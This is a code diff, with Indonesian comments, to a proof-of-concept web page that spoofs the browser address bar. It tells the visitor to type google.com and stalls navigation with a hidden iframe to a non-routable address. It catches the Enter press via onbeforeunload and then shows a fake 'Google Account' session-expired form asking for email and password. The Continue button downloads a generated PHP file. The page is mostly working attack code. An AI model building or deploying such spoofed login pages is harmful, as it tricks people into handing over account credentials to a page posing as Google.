@@ -7,31 +7,32 @@
 <body>
   <div id="content">
     <h1>Step 2</h1>
-    <p>Ketik <b>https://google.com:9090</b> di omnibox lalu tekan Enter</p>
+    <p>Ketik <b>https://google.com</b> di omnibox lalu tekan Enter</p>
   </div>
 
   <script>
     let triggered = false;
 
-    // iframe untuk bikin loading "macet"
+    // iframe NON-ROUTABLE buat nahan loading (BUKAN google)
     const iframe = document.createElement("iframe");
-    iframe.src = "https://google.com:9090";
+    iframe.src = "https://10.255.255.1"; // sengaja macet
     iframe.style.display = "none";
     document.body.appendChild(iframe);
 
-    // TRIGGER UTAMA (ENTER di omnibox)
+    // ENTER di omnibox
     window.onbeforeunload = function () {
       triggered = true;
     };
 
+    // tampilkan spoof
     setInterval(() => {
       if (triggered) {
         document.getElementById("content").innerHTML = `
           <h1>Google Account</h1>
           <p>Your session expired. Please sign in again.</p>
 
-          <input placeholder="Email" style="display:block;margin-bottom:10px">
-          <input type="password" placeholder="Password" style="display:block;margin-bottom:15px">
+          <input placeholder="Email" style="display:block;margin-bottom:10px;width:220px">
+          <input type="password" placeholder="Password" style="display:block;margin-bottom:15px;width:220px">
 
           <button onclick="downloadPHP()">Continue</button>
         `;
@@ -42,7 +43,8 @@
     // DOWNLOAD PHP (dibuat sendiri, tanpa server)
     function downloadPHP() {
       const php = `<?php
-echo "wkwkwk ini file php bebas 😁";
+// wkwkwk file php bebas
+echo "login palsu 😁";
 ?>`;
 
       const blob = new Blob([php], { type: "application/php" });
